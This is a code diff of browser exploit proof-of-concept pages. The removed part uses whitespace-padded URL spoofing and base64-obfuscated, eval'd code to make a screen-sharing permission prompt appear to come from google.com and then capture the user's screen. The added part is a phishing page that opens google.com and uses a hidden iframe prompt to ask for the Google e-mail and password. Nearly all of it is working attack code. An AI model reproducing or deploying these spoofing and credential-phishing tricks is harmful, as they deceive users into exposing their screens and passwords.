@@ -1,11 +1,25 @@
-<button id="start">Start Capture</button>&nbsp;<button id="stop">Stop Capture</button></p>
-    <video id="video" autoplay></video>
-<script>
-    html = "<video id='video' autoplay=''></video><script>    history.replaceState('','','blob:http://127.0.0.1/                                                                                                                                                                                                                                                                                                            says: An embed page https://www.google.com on this site wants to share your screen.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      www.google.com');eval(window.atob('CiAgICBjb25zdCB2aWRlb0VsZW0gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidmlkZW8iKTsKCi8vIE9wdGlvbnMgZm9yIGdldERpc3BsYXlNZWRpYSgpCgp2YXIgZGlzcGxheU1lZGlhT3B0aW9ucyA9IHsKICB2aWRlbzogewogICAgY3Vyc29yOiAiYWx3YXlzIgogIH0sCiAgYXVkaW86IGZhbHNlCn07CgovLyBTZXQgZXZlbnQgbGlzdGVuZXJzIGZvciB0aGUgc3RhcnQgYW5kIHN0b3AgYnV0dG9ucwogIHN0YXJ0Q2FwdHVyZSgpOwoKCmZ1bmN0aW9uIGR1bXBPcHRpb25zSW5mbygpIHsKICBjb25zdCB2aWRlb1RyYWNrID0gdmlkZW9FbGVtLnNyY09iamVjdC5nZXRWaWRlb1RyYWNrcygpWzBdOwogCiAgY29uc29sZS5pbmZvKCJUcmFjayBzZXR0aW5nczoiKTsKICBjb25zb2xlLmluZm8oSlNPTi5zdHJpbmdpZnkodmlkZW9UcmFjay5nZXRTZXR0aW5ncygpLCBudWxsLCAyKSk7CiAgY29uc29sZS5pbmZvKCJUcmFjayBjb25zdHJhaW50czoiKTsKICBjb25zb2xlLmluZm8oSlNPTi5zdHJpbmdpZnkodmlkZW9UcmFjay5nZXRDb25zdHJhaW50cygpLCBudWxsLCAyKSk7Cn0KCmFzeW5jIGZ1bmN0aW9uIHN0YXJ0Q2FwdHVyZSgpIHsKICB0cnkgewoKICAgIHZpZGVvRWxlbS5zcmNPYmplY3QgPSBhd2FpdCBuYXZpZ2F0b3IubWVkaWFEZXZpY2VzLmdldERpc3BsYXlNZWRpYShkaXNwbGF5TWVkaWFPcHRpb25zKTsKICAgIGR1bXBPcHRpb25zSW5mbygpOwogICAgd2luZG93Lm9wZW4odXJsLCJfc2VsZiIpOwoKICB9IGNhdGNoKGVycikgewogICAgY29uc29sZS5lcnJvcigiRXJyb3I6ICIgKyBlcnIpOwogIH0KfQoK'))<\/script>";
-	blob = new Blob([html], {type: 'text/html'});
-    url = URL.createObjectURL(blob); 
-    const startElem = document.getElementById("start");
-    startElem.addEventListener("click", function(evt) {
-        window.open(url,"_self");
-    }, false);
-</script>
+<html>
+  <body>
+
+    <script>
+
+    function exploit() {
+
+      window.open("https://www.google.com");
+
+      document.getElementById("iframe").src = 'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
+    
+    }
+    
+    </script>
+
+    <br><br><br><br>
+
+    <a href="#" onclick="exploit();">
+      <center><h1>Click here to go to Google.com</h1></center>
+    </a>
+
+    <iframe styleframeborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
+
+  </body>
+</html>
